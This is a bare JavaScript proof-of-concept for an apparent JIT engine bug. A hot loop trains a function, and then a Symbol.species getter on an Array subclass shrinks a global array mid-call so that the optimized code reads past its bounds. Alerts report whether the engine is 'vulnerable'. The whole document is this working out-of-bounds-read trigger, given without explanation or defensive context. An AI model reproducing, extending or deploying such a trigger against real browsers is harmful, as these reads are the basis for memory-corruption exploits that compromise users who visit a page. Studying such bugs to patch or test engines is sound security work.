let Trigger = false;
let Arr = null;

function Target(Special, Idx) {
    Arr[Idx]; 
    Special.slice(); 
    return Arr[Idx]; 
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0; 
                alert('Length set to 0 by Symbol.species');
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x7);
    Arr.fill(1337); 
    for (let Idx = 0; Idx < 0x1000; Idx++) {
        Target(Snowflake, 0x0); 
    }
    Trigger = true;
    const Ret = Target(Snowflake, 0x5); 
    if (Ret === undefined) {
        alert(':( not vulnerable');
    } else {
        alert(':) vulnerable, Ret = ' + Ret);
    }
    alert('Arr[5] = ' + Arr[5]); 
}

main();